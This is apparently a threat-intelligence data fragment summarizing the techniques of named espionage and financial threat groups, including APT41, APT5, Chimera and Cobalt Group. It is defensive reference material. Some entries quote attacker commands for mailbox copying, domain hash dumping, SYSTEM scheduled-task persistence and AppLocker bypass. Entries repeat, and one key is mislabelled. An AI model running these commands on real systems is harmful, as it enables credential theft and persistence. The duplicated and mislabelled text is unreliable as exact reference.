    "BARIUM": "APT41 has transferred implant files using Windows Admin Shares and the Server Message Block (SMB) protocol, then executes files through Windows Management Instrumentation (WMI)., APT41 has used MiPing to discover active systems in the victim network. , APT41 deployed a Monero cryptocurrency mining tool in a victim’s environment., APT41 deployed rootkits on Linux systems., APT41 used a compromised account to create a scheduled task on a system.During C0017, APT41 used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: /Microsoft/Windows/PLA/Server Manager Performance Monitor, /Microsoft/Windows/Ras/ManagerMobility, /Microsoft/Windows/WDI/SrvSetupResults, and /Microsoft/Windows/WDI/USOShared. , During C0017, APT41 used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: /Microsoft/Windows/PLA/Server Manager Performance Monitor, /Microsoft/Windows/Ras/ManagerMobility, /Microsoft/Windows/WDI/SrvSetupResults, and /Microsoft/Windows/WDI/USOShared. , APT41 uses the Chinese website fofa.su, similar to the Shodan scanning service, for passive scanning of victims.APT41 DUST used internet scan data for target development., APT41 DUST used internet scan data for target development., APT41 DUST involved use of search engines to research victim servers., APT41 DUST involved access of external victim websites for target development., APT41 DUST involved use of web shells such as ANTSWORD and BLUEBEAM for persistence.During C0017, APT41 deployed JScript web shells through the creation of malicious ViewState objects., During C0017, APT41 deployed JScript web shells through the creation of malicious ViewState objects., APT41 leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.APT41 DUST used stolen code signing certificates for DUSTTRAP malware and subsequent payloads., APT41 DUST used stolen code signing certificates for DUSTTRAP malware and subsequent payloads., APT41 gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users., APT41 used compiled HTML (.chm) files for targeting. , APT41 has used rundll32.exe to execute a loader., APT41 uses multiple built-in commands such as systeminfo and net config Workstation to enumerate victim system basic configuration information.During C0017, APT41 issued ping -n 1 ((cmd /c dir c:/|findstr Number).split()[-1]+ commands to find the volume serial number of compromised systems., During C0017, APT41 issued ping -n 1 ((cmd /c dir c:/|findstr Number).split()[-1]+ commands to find the volume serial number of compromised systems., APT41 collected MAC addresses from victim machines. During C0017, APT41 used cmd.exe /c ping %userdomain% for discovery., During C0017, APT41 used cmd.exe /c ping %userdomain% for discovery., APT41 has enumerated IP addresses of network resources and used the netstat command as part of network reconnaissance. The group has also used a malware variant, HIGHNOON, to enumerate active RDP sessions., APT41 has executed whoami commands, including using the WMIEXEC utility to execute this on remote machines.During C0017, APT41 used whoami to gather information from victim machines., During C0017, APT41 used whoami to gather information from victim machines., APT41 used  svchost.exe and Net to execute a system service installed to launch a Cobalt Strike BEACON loader.APT41 DUST used Windows services to execute DUSTPAN., APT41 DUST used Windows services to execute DUSTPAN., APT41 uses tools such as Mimikatz to enable lateral movement via captured password hashes., APT41 used compromised credentials to log on to other systems., APT41 used legitimate websites for C2 through dead drop resolvers (DDR), including GitHub, Pastebin, and Microsoft TechNet.During C0017, APT41 used dead drop resolvers on two separate tech community forums for their KEYPLUG Windows-version backdoor; notably APT41 updated the community forum posts frequently with new dead drop resolvers during the campaign., During C0017, APT41 used dead drop resolvers on two separate tech community forums for their KEYPLUG Windows-version backdoor; notably APT41 updated the community forum posts frequently with new dead drop resolvers during the campaign., APT41 used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via PowerSploit. APT41 has executed files through Windows Management Instrumentation (WMI).",
    "APT5": "APT5 is a China-based espionage actor that has been active since at least 2007 primarily targeting the telecommunications, aerospace, and defense industries throughout the U.S., Europe, and Asia. APT5 has displayed advanced tradecraft and significant interest in compromising networking devices and their underlying software including through the use of zero-day exploits. , , , , , , APT5 has created their own accounts with Local Administrator privileges to maintain access to systems with short-cycle credential rotation., APT5 has used the JAR/ZIP file format for exfiltrated files., APT5 has used PowerShell to accomplish tasks within targeted environments., APT5 has used cmd.exe for execution on compromised systems., APT5 has modified legitimate binaries and scripts for Pulse Secure VPNs including the legitimate DSUpgrade.pm file to install the ATRIUM webshell for persistence., APT5 has created Local Administrator accounts to maintain access to systems with short-cycle credential rotation., APT5 has staged data on compromised systems prior to exfiltration often in C:/Users/Public., APT5 has exploited vulnerabilities in externally facing software and devices including Pulse Secure VPNs and Citrix Application Delivery Controllers. , APT5 has used the BLOODMINE utility to discover files with .css, .jpg, .png, .gif, .ico, .js, and .jsp extensions in Pulse Secure Connect logs., APT5 has used the CLEANPULSE utility to insert command line strings into a targeted process to prevent certain log events from occurring., APT5 has used the THINBLOOD utility to clear SSL VPN log files located at /home/runtime/logs., APT5 has cleared the command history on targeted ESXi servers., APT5 has deleted scripts and web shells to evade detection., APT5 has modified file timestamps., APT5 has used malware with keylogging capabilities to monitor the communications of targeted entities., APT5 has used the BLOODMINE utility to parse and extract information from Pulse Secure Connect logs., APT5 has named exfiltration archives to mimic Windows Updates at times using filenames with a KB<digits>.zip pattern., APT5 has used the Task Manager process to target LSASS process memory in order to obtain NTLM password hashes. APT5 has also dumped clear text passwords and hashes from memory using Mimikatz hosted through an RDP mapped drive., APT5 has copied and exfiltrated the SAM Registry hive from targeted systems., APT5 has used Windows-based utilities to carry out tasks including tasklist.exe. , APT5 has used the CLEANPULSE utility to insert command line strings into a targeted process to alter its functionality., APT5 has moved laterally throughout victim environments using RDP., APT5 has used SSH for lateral movement in compromised environments including for enabling access to ESXi host servers., APT5 has made modifications to the crontab file including in /var/cron/tabs/., APT5 has installed multiple web shells on compromised servers including on Pulse Secure VPN appliances., APT5 has used the BLOODMINE utility to collect data on web requests from Pulse Secure Connect logs., APT5 has used legitimate account credentials to move laterally through compromised environments., APT5 has accessed Microsoft M365 cloud environments using stolen credentials.",
    "Aquatic Panda": "Aquatic Panda is a suspected China-based threat group with a dual mission of intelligence collection and industrial espionage. Active since at least May 2020, Aquatic Panda has primarily targeted entities in the telecommunications, technology, and government sectors., Aquatic Panda used the last command in Linux environments to identify recently logged-in users on victim machines., Aquatic Panda has used publicly accessible DNS logging services to identify servers vulnerable to Log4j (CVE 2021-44228)., Aquatic Panda has used several publicly available tools, including WinRAR and 7zip, to compress collected files and memory dumps prior to exfiltration., Aquatic Panda has downloaded additional scripts and executed Base64 encoded commands in PowerShell., Aquatic Panda has attempted and failed to run Bash commands on a Windows host by passing them to cmd /C., Aquatic Panda used malicious shell scripts in Linux environments following access via SSH to install Linux versions of Winnti malware., Aquatic Panda created new Windows services for persistence that masqueraded as legitimate Windows services via name change., Aquatic Panda captured local Windows security event log data from victim machines using the wevtutil utility to extract contents to an evtx output file., Aquatic Panda has used DLL search-order hijacking to load exe, dll, and dat files into memory. Aquatic Panda loaded a malicious DLL into the legitimate Windows Security Health Service executable (SecurityHealthService.exe) to execute malicious code on victim systems., Aquatic Panda modified the ld.so preload file in Linux environments to enable persistence for Winnti malware., Aquatic Panda has attempted to stop endpoint detection and response (EDR) tools on compromised systems., Aquatic Panda clears Windows Event Logs following activity to evade defenses., Aquatic Panda cleared command history in Linux environments to remove traces of activity after operations., Aquatic Panda has deleted malicious executables from compromised machines., Aquatic Panda has downloaded additional malware onto compromised hosts., Aquatic Panda enumerated logs related to authentication in Linux environments prior to deleting selective entries for defense evasion purposes., Aquatic Panda created new, malicious services using names such as Windows User Service to attempt to blend in with legitimate items on victim systems., Aquatic Panda renamed or moved malicious binaries to legitimate locations to evade defenses and blend into victim environments., Aquatic Panda modified the victim registry to enable the RestrictedAdmin mode feature, allowing for pass the hash behaviors to function via RDP., Aquatic Panda has encoded PowerShell commands in Base64., Aquatic Panda has acquired and used njRAT in its operations., Aquatic Panda has acquired and used Cobalt Strike in its operations., Aquatic Panda has attempted to harvest credentials through LSASS memory dumping., Aquatic Panda used remote scheduled tasks to install malicious software on victim systems during lateral movement actions., Aquatic Panda leveraged stolen credentials to move laterally via RDP in victim environments., Aquatic Panda used remote shares to enable lateral movement in victim environments., Aquatic Panda used SSH with captured user credentials to move laterally in victim environments., Aquatic Panda has attempted to discover third party endpoint detection and response (EDR) tools on compromised systems., Aquatic Panda used rundll32.exe to proxy execution of a malicious DLL file identified as a keylogging binary., Aquatic Panda has used native OS commands to understand privilege levels and system details., Aquatic Panda gathers information on recently logged-in users on victim devices., Aquatic Panda has attempted to discover services for third party EDR products., Aquatic Panda used a registry edit to enable a Windows feature called RestrictedAdmin in victim environments. This change allowed Aquatic Panda to leverage 'pass the hash' mechanisms as the alteration allows for RDP connections with a valid account name and hash only, without possessing a cleartext password value., Aquatic Panda used multiple mechanisms to capture valid user accounts for victim domains to enable lateral movement and access to additional hosts in victim environments., Aquatic Panda used WMI for lateral movement in victim environments.",
    "Axiom": "Axiom is a suspected Chinese cyber espionage group that has targeted the aerospace, defense, government, manufacturing, and media sectors since at least 2008. Some reporting suggests a degree of overlap between Axiom and Winnti Group but the two groups appear to be distinct based on differences in reporting on TTPs and targeting., , Axiom has acquired dynamic DNS services for use in the targeting of intended victims., Axiom has used VPS hosting providers in targeting of intended victims., Axiom has compressed and encrypted data prior to exfiltration., Axiom has used large groups of compromised machines for use as proxy nodes., Axiom has collected data from a compromised network., Axiom has used steganography to hide its C2 communications., Axiom has used watering hole attacks to gain access., Axiom actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence., Axiom has been observed using SQL injection to gain access to systems., Axiom has used exploits for multiple vulnerabilities including CVE-2014-0322, CVE-2012-4792, CVE-2012-1889, and CVE-2013-3893., Axiom has been known to dump credentials., Axiom has used spear phishing to initially compromise victims., Axiom has targeted victims with remote administration tools including RDP., Axiom has used RDP during operations., Axiom has used digital certificates to deliver malware., Axiom has used previously compromised administrative accounts to escalate privileges.",
    "BackdoorDiplomacy": "BackdoorDiplomacy is a cyber espionage threat group that has been active since at least 2017. BackdoorDiplomacy has targeted Ministries of Foreign Affairs and telecommunication companies in Africa, Europe, the Middle East, and Asia., BackdoorDiplomacy has copied files of interest to the main drive's recycle bin., BackdoorDiplomacy has exploited CVE-2020-5902, an F5 BIP-IP vulnerability, to drop a Linux backdoor. BackdoorDiplomacy has also exploited mis-configured Plesk servers., BackdoorDiplomacy has executed DLL search order hijacking., BackdoorDiplomacy has downloaded additional files and tools onto a compromised host., BackdoorDiplomacy has disguised their backdoor droppers with naming conventions designed to blend into normal operations., BackdoorDiplomacy has dropped implants in folders named for legitimate software., BackdoorDiplomacy has used SMBTouch, a vulnerability scanner, to determine whether a target is vulnerable to EternalBlue malware., BackdoorDiplomacy has used EarthWorm for network tunneling with a SOCKS5 server and port transfer functionalities., BackdoorDiplomacy has obfuscated tools and malware it uses with VMProtect., BackdoorDiplomacy has obtained and used leaked malware, including DoublePulsar, EternalBlue, EternalRocks, and EternalSynergy, in its operations., BackdoorDiplomacy has obtained a variety of open-source reconnaissance and red team tools for discovery and lateral movement., BackdoorDiplomacy has used an executable to detect removable media, such as USB flash drives., BackdoorDiplomacy has dropped legitimate software onto a compromised host and used it to execute malicious DLLs., BackdoorDiplomacy has used web shells to establish an initial foothold and for lateral movement within a victim's system., BackdoorDiplomacy has used NetCat and PortQry  to enumerate network connections and display the status of related TCP and UDP ports.",
    "BITTER": "BITTER is a suspected South Asian cyber espionage threat group that has been active since at least 2013. BITTER has targeted government, energy, and engineering organizations in Pakistan, China, Bangladesh, and Saudi Arabia., , BITTER has registered a variety of domains to host malicious payloads and for C2., BITTER has used HTTP POST requests for C2., BITTER has used DDNS for C2 communications., BITTER has encrypted their C2 communications., BITTER has exploited Microsoft Office vulnerabilities CVE-2012-0158, CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802., BITTER has exploited CVE-2021-1732 for privilege escalation., BITTER has downloaded additional malware and tools onto a compromised host. , BITTER has executed OLE objects using Microsoft Equation Editor to download and run malicious payloads. , BITTER has disguised malware as a Windows Security update service., BITTER has used TCP for C2 communications., BITTER has used a RAR SFX dropper to deliver malware., BITTER has obtained tools such as PuTTY for use in their operations., BITTER has sent spearphishing emails with a malicious RTF document or Excel spreadsheet., BITTER has used scheduled tasks for persistence and execution., BITTER has registered domains to stage payloads., BITTER has attempted to lure victims into opening malicious attachments delivered via spearphishing., BITTER has delivered malicious applications to victims via shortened URLs distributed through SMS, WhatsApp, and various social media platforms.",
    "BlackOasis": "BlackOasis is a Middle Eastern threat group that is believed to be a customer of Gamma Group. The group has shown interest in prominent figures in the United Nations, as well as opposition bloggers, activists, regional news correspondents, and think tanks.   A group known by Microsoft as NEODYMIUM is reportedly associated closely with BlackOasis operations, but evidence that the group names are aliases has not been identified. , BlackOasis's first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools.",
    "BlackTech": "BlackTech is a suspected Chinese cyber espionage group that has primarily targeted organizations in East Asia--particularly Taiwan, Japan, and Hong Kong--and the US since at least 2013. BlackTech has used a combination of custom malware, dual-use tools, and living off the land tactics to compromise media, construction, engineering, electronics, and financial company networks., , BlackTech has exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0, CVE-2017-7269, in order to establish a new HTTP or command and control (C2) server., BlackTech has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, and Adobe Flash CVE-2015-5119., BlackTech has used DLL side loading by giving DLLs hardcoded names and placing them in searched directories. , BlackTech has used right-to-left-override to obfuscate the filenames of malicious e-mail attachments., BlackTech has used built-in API functions., BlackTech has used the SNScan tool to find other potential targets on victim networks., BlackTech has obtained and used tools such as Putty, SNScan, and PsExec for its operations., BlackTech has used stolen code-signing certificates for its malicious payloads., BlackTech has used valid, stolen digital certificates for some of their malware and tools., BlackTech has used spearphishing e-mails with malicious password-protected archived files (ZIP or RAR) to deliver malware., BlackTech has used spearphishing e-mails with links to cloud services to deliver malware., BlackTech has used Putty for remote access., BlackTech has used e-mails with malicious links to lure victims into installing malware. , BlackTech has used e-mails with malicious documents to lure victims into installing malware.",
    "Blue Mockingbird": "Blue Mockingbird is a cluster of observed activity involving Monero cryptocurrency-mining payloads in dynamic-link library (DLL) form on Windows systems. The earliest observed Blue Mockingbird tools were created in December 2019., Blue Mockingbird has used JuicyPotato to abuse the SeImpersonate token privilege to escalate from web application pool accounts to NT Authority/SYSTEM., Blue Mockingbird has used PowerShell reverse TCP shells to issue interactive commands over a network connection., Blue Mockingbird has used batch script files to automate execution and deployment of payloads., Blue Mockingbird has made their XMRIG payloads persistent as a Windows Service., Blue Mockingbird has used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file., Blue Mockingbird has gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX., Blue Mockingbird has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR., Blue Mockingbird has masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file., Blue Mockingbird has used Windows Registry modifications to specify a DLL payload. , Blue Mockingbird has obfuscated the wallet address in the payload binary., Blue Mockingbird has obtained and used tools such as Mimikatz., Blue Mockingbird has used Mimikatz to retrieve credentials from LSASS memory., Blue Mockingbird has used FRP, ssf, and Venom to establish SOCKS proxy connections., Blue Mockingbird has used Remote Desktop to log on to servers interactively and manually copy files to remote hosts., Blue Mockingbird has used Windows Explorer to manually copy malicious files to remote hosts over SMB., Blue Mockingbird has used XMRIG to mine cryptocurrency on victim systems., Blue Mockingbird has used Windows Scheduled Tasks to establish persistence on local and remote hosts., Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using regsvr32.exe. , Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using rundll32.exe., Blue Mockingbird has collected hardware details for the victim's system, including CPU and memory information., Blue Mockingbird has executed custom-compiled XMRIG miner DLLs by configuring them to execute via the 'wercplsupport' service. , Blue Mockingbird has used wmic.exe to set environment variables.",
    "Bouncing Golf": "Bouncing Golf is a cyberespionage campaign targeting Middle Eastern countries., Bouncing Golf distributed malware as repackaged legitimate applications, with the malicious code in the com.golf package.",
    "BRONZE BUTLER": "BRONZE BUTLER is a cyber espionage group with likely Chinese origins that has been active since at least 2008. The group primarily targets Japanese organizations, particularly those in government, biotechnology, electronics manufacturing, and industrial chemistry., , , BRONZE BUTLER has used a Windows 10 specific tool and xxmm to bypass UAC for privilege escalation., BRONZE BUTLER has used net user /domain to identify account information., BRONZE BUTLER malware has used HTTP for C2., BRONZE BUTLER has compressed data into password-protected RAR archives prior to exfiltration., BRONZE BUTLER has used a batch script that adds a Registry Run key to establish malware persistence., BRONZE BUTLER has used PowerShell for execution., BRONZE BUTLER has used batch scripts and the command-line interface for execution., BRONZE BUTLER has used VBS and VBE scripts for execution., BRONZE BUTLER has made use of Python-based remote access tools., Several BRONZE BUTLER tools encode data with base64 when posting it to a C2 server., BRONZE BUTLER has exfiltrated files stolen from local systems., BRONZE BUTLER has exfiltrated files stolen from file shares., BRONZE BUTLER downloads encoded payloads and decodes them on the victim., BRONZE BUTLER compromised three Japanese websites using a Flash exploit to perform watering hole attacks., BRONZE BUTLER has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic. BRONZE BUTLER has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server., BRONZE BUTLER has exploited Microsoft Office vulnerabilities CVE-2014-4114, CVE-2018-0802, and CVE-2018-0798 for execution., BRONZE BUTLER has collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal., BRONZE BUTLER has used legitimate applications to side-load malicious DLLs., BRONZE BUTLER has incorporated code into several tools that attempts to terminate anti-virus processes., The BRONZE BUTLER uploader or malware the uploader uses command to delete the RAR archives after they have been exfiltrated., BRONZE BUTLER has used various tools to download files, including DGet (a similar tool to wget)., BRONZE BUTLER has masked executables with document file icons including Word and Adobe PDF., BRONZE BUTLER has used Right-to-Left Override to deceive victims into executing several strains of malware., BRONZE BUTLER has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems., BRONZE BUTLER downloader code has included '0' characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection., BRONZE BUTLER has used steganography in multiple operations to conceal malicious payloads., BRONZE BUTLER has obtained and used open-source tools such as Mimikatz, gsecdump, and Windows Credential Editor., BRONZE BUTLER has used various tools (such as Mimikatz and WCE) to perform credential dumping., BRONZE BUTLER used spearphishing emails with malicious Microsoft Word attachments to infect victims., BRONZE BUTLER typically use ping and Net to enumerate systems., BRONZE BUTLER has used at to register a scheduled task to execute malware during lateral movement., BRONZE BUTLER has used schtasks to register a scheduled task to execute malware during lateral movement., BRONZE BUTLER has used a tool to capture screenshots., BRONZE BUTLER has used tools to enumerate software installed on an infected host., BRONZE BUTLER has used TROJ_GETVERSION to discover system services., BRONZE BUTLER has used net time to check the local time on a target system., BRONZE BUTLER has placed malware on file shares and given it the same name as legitimate documents on the share., BRONZE BUTLER has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access., BRONZE BUTLER has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails., BRONZE BUTLER's MSGET downloader uses a dead drop resolver to access malicious payloads.",
    "Carbanak": "Carbanak is a cybercriminal group that has used Carbanak malware to target financial institutions since at least 2013. Carbanak may be linked to groups tracked separately as Cobalt Group and FIN7 that have also used Carbanak malware., , Carbanak malware installs itself as a service to provide persistence and SYSTEM privileges., Carbanak may use netsh to add local firewall rule exceptions., Carbanak has copied legitimate service names to use for malicious services., Carbanak has named malware 'svchost.exe,' which is the name of the Windows shared service host program., Carbanak has obtained and used open-source tools such as PsExec and Mimikatz., Carbanak used legitimate programs such as AmmyyAdmin and Team Viewer for remote interactive C2 to target systems., Carbanak installs VNC server software that executes through rundll32., Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars., Carbanak has used a VBScript named 'ggldr' that uses Google Apps Script, Sheets, and Forms services for C2.",
    "Chimera": "Chimera is a suspected China-based threat group that has been active since at least 2018 targeting the semiconductor industry in Taiwan as well as data from the airline industry., Chimera has used net user for account discovery., Chimera has has used net user /dom and net user Administrator to enumerate domain accounts including administrator accounts., Chimera has used HTTPS for C2 communications., Chimera has used Cobalt Strike to encapsulate C2 in DNS traffic., Chimera has used gzip for Linux OS and a modified RAR software to archive data on Windows hosts., Chimera has used custom DLLs for continuous retrieval of data from memory., Chimera has used type //c$/Users//Favorites/Links/Bookmarks bar/Imported From IE*citrix* for bookmark discovery., Chimera has used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts., Chimera has used credential stuffing against victim's remote services to obtain valid accounts., Chimera has used PowerShell scripts to execute malicious payloads and the DSInternals PowerShell module to make use of Active Directory features. , Chimera has used the Windows Command Shell and batch scripts for execution on compromised hosts., Chimera has collected documents from the victim's SharePoint., Chimera has collected data of interest from network shares., Chimera has staged stolen data locally on compromised hosts., Chimera has staged stolen data on designated servers in the target environment., Chimera has nltest /domain_trusts to identify domain trust relationships., Chimera has harvested data from victim's e-mail including through execution of wmic /node: process call create 'cmd /c copy c:/Users///backup.pst c:/windows/temp/backup.pst' copy 'i:///My Documents/.pst'copy., Chimera has harvested data from remote mailboxes including through execution of //c$/Users//AppData/Local/Microsoft/Outlook*.ost., Chimera has used Cobalt Strike C2 beacons for data exfiltration. , Chimera has exfiltrated stolen data to OneDrive accounts., Chimera has used legitimate credentials to login to an external VPN, Citrix, SSH, and other remote services., Chimera has utilized multiple commands to identify data of interest in file and directory listings., Chimera has collected credentials for the target organization from previous breaches for use in brute force attacks., Chimera has used side loading to place malicious DLLs in memory., Chimera has cleared event logs on compromised hosts., Chimera has performed file deletion to evade detection. , Chimera has used a Windows version of the Linux touch command to modify the date and time stamp on DLLs., Chimera has remotely copied tools and malware onto targeted systems., Chimera has copied tools between compromised hosts using SMB., Chimera has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe., Chimera's malware has altered the NTLM authentication program on domain controllers to allow Chimera to login without a valid credential. , Chimera has registered alternate phone numbers for compromised users to intercept 2FA codes sent via SMS., Chimera has used direct Windows system calls by leveraging Dumpert., Chimera has used the get -b  -e  -p command for network scanning as well as a custom Python tool  packed into a Windows executable named Get.exe to scan IP ranges for HTTP., Chimera has used net share and net view to identify network shares of interest., Chimera has encoded PowerShell commands. , Chimera has obtained and used tools such as BloodHound, Cobalt Strike, Mimikatz, and PsExec., Chimera has gathered the SYSTEM registry and ntds.dit files from target systems. Chimera specifically has used the NtdsAudit tool to dump the password hashes of domain users via msadcs.exe 'NTDS.dit' -s 'SYSTEM' -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv and used ntdsutil to copy the Active Directory database., Chimera has used the NtdsAudit utility to collect information related to accounts and passwords., Chimera has used net localgroup administrators to identify  accounts with local administrative rights., Chimera has used tasklist to enumerate processes., Chimera has encapsulated Cobalt Strike's C2 protocol in DNS and HTTPS., Chimera has queried Registry keys using reg query //HKU//SOFTWARE/Microsoft/Terminal Server Client/Servers and reg query //HKU//Software/Microsoft/Windows/CurrentVersion/Internet Settings., Chimera has used RDP to access targeted systems., Chimera has used Windows admin shares to move laterally., Chimera has used WinRM for lateral movement., Chimera has utilized various scans and queries to find domain controllers and remote services in the target environment., Chimera has used scheduled tasks to invoke Cobalt Strike including through batch script schtasks /create /ru 'SYSTEM' /tn 'update' /tr 'cmd /c c:/windows/temp/update.bat' /sc once /f /st and to maintain persistence., Chimera has used fsutil fsinfo drives, systeminfo, and vssadmin list shadows for system information including shadow volumes and drive information., Chimera has used ipconfig, Ping, and tracert to enumerate the IP address and network environment and settings of the local host., Chimera has used netstat -ano | findstr EST to discover network connections., Chimera has used the quser command to show currently logged on users. , Chimera has used net start and net use for system service discovery., Chimera has used PsExec to deploy beacons on compromised systems., Chimera has used time /t and net time /ip/hostname for system time discovery., Chimera has dumped password hashes for use in pass the hash authentication attacks., Chimera has used a valid account to maintain persistence via scheduled task., Chimera has used compromised domain accounts to gain access to the target environment., Chimera has used WMIC to execute remote commands.",
    "Cinnamon Tempest": "Cinnamon Tempest is a China-based threat group that has been active since at least 2021 deploying multiple strains of ransomware based on the leaked Babuk source code. Cinnamon Tempest does not operate their ransomware on an affiliate model or purchase access but appears to act independently in all stages of the attack lifecycle. Based on victimology, the short lifespan of each ransomware variant, and use of malware attributed to government-sponsored threat groups, Cinnamon Tempest may be motivated by intellectual property theft or cyberespionage rather than financial gain., , , , Cinnamon Tempest has used PowerShell to communicate with C2, download files, and execute reconnaissance commands., Cinnamon Tempest has executed ransomware using batch scripts deployed via GPO., Cinnamon Tempest has used a customized version of the Impacket wmiexec.py module to create renamed output files., Cinnamon Tempest has created system services to establish persistence for deployed tooling., Cinnamon Tempest has used weaponized DLLs to load and decrypt payloads., Cinnamon Tempest has used Group Policy to deploy batch scripts for ransomware deployment., Cinnamon Tempest has uploaded captured keystroke logs to the Alibaba Cloud Object Storage Service, Aliyun OSS., Cinnamon Tempest has exploited multiple unpatched vulnerabilities for initial access including vulnerabilities in Microsoft Exchange, Manage Engine AdSelfService Plus, Confluence, and Log4j., Cinnamon Tempest has maintained leak sites for exfiltrated data in attempt to extort victims into paying a ransom., Cinnamon Tempest has used search order hijacking to launch Cobalt Strike Beacons., Cinnamon Tempest has abused legitimate executables to side-load weaponized DLLs., Cinnamon Tempest has downloaded files, including Cobalt Strike, to compromised hosts., Cinnamon Tempest has used open-source tools including customized versions of the Iox proxy tool, NPS tunneling tool, Meterpreter, and a keylogger that uploads data to Alibaba cloud storage., Cinnamon Tempest has used the Iox and NPS proxy and tunneling tools in combination  create multiple connections through a single tunnel., Cinnamon Tempest has used a customized version of the Iox port-forwarding and proxy tool., Cinnamon Tempest has used SMBexec for lateral movement., Cinnamon Tempest has deployed ransomware from a batch file in a network share., Cinnamon Tempest has used compromised user accounts to deploy payloads and create system services., Cinnamon Tempest has obtained highly privileged credentials such as domain administrator in order to deploy malware., Cinnamon Tempest has used Impacket for lateral movement via WMI.",
    "Cleaver": "Cleaver is a threat group that has been attributed to Iranian actors and is responsible for activity tracked as Operation Cleaver.  Strong circumstantial evidence suggests Cleaver is linked to Threat Group 2889 (TG-2889). , , , Cleaver has used custom tools to facilitate ARP cache poisoning., Cleaver has created customized tools and payloads for functions including ARP poisoning, encryption, credential dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and SMB communications, network interface sniffing, and keystroke logging., Cleaver has created fake LinkedIn profiles that included profile photos, details, and connections., Cleaver has obtained and used open-source tools such as PsExec, Windows Credential Editor, and Mimikatz., Cleaver has been known to dump credentials using Mimikatz and Windows Credential Editor.",
    "Cobalt Group": "Cobalt Group is a financially motivated threat group that has primarily targeted financial institutions since at least 2016. The group has conducted intrusions to steal money via targeting ATM systems, card processing, payment systems and SWIFT systems. Cobalt Group has mainly targeted banks in Eastern Europe, Central Asia, and Southeast Asia. One of the alleged leaders was arrested in Spain in early 2018, but the group still appears to be active. The group has been known to target organizations in order to use their access to then compromise additional victims. Reporting indicates there may be links between Cobalt Group and both the malware Carbanak and the group Carbanak., ,  , , Cobalt Group has bypassed UAC., Cobalt Group has used HTTPS for C2., Cobalt Group has used DNS tunneling for C2., Cobalt Group has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike., Cobalt Group has added persistence by registering the file name for the next stage malware under HKCU/Environment/UserInitMprLogonScript., Cobalt Group has used powershell.exe to download and execute scripts., Cobalt Group has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands. The group has used an exploit toolkit known as Threadkit that launches .bat files., Cobalt Group has sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution., Cobalt Group has executed JavaScript scriptlets on the victim's machine., Cobalt Group has created new services to establish persistence., Cobalt Group has used the Plink utility to create SSH tunnels., Cobalt Group had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759., Cobalt Group has used exploits to increase their levels of rights and privileges., Cobalt Group deleted the DLL dropper from the victim’s machine to cover their tracks., Cobalt Group has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers. The group's JavaScript backdoor is also capable of downloading files., Cobalt Group has sent malicious Word OLE compound documents to victims., Cobalt Group leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning., Cobalt Group obfuscated several scriptlets and code used on the victim’s machine, including through use of XOR and RC4., Cobalt Group has obtained and used a variety of tools including Mimikatz, PsExec, Cobalt Strike, and SDelete., Cobalt Group has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf, .doc, .xls, archives containing LNK files, and password protected archives containing .exe and .scr executables., Cobalt Group has sent emails with URLs pointing to malicious documents., Cobalt Group has injected code into trusted processes., Cobalt Group has used the Plink utility to create SSH tunnels., Cobalt Group used the Ammyy Admin tool as well as TeamViewer for remote access, including to preserve remote access if a Cobalt Strike module was lost., Cobalt Group has used Remote Desktop Protocol to conduct lateral movement., Cobalt Group has created Windows tasks to establish persistence., Cobalt Group used a JavaScript backdoor that is capable of collecting a list of the security solutions installed on the victim's machine., Cobalt Group has compromised legitimate web browser updates to deliver a backdoor. , Cobalt Group has used the command cmstp.exe /s /ns C:/Users/ADMINI~W/AppData/Local/Temp/XKNqbpzl.txt to bypass AppLocker and launch a malicious script., Cobalt Group has used odbcconf to proxy the execution of malicious DLL files., Cobalt Group has used regsvr32.exe to execute scripts., Cobalt Group has sent emails containing malicious links that require users to execute a file or macro to infect the victim machine., Cobalt Group has sent emails containing malicious attachments that require users to execute a file or macro to infect the victim machine., Cobalt Group used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.",
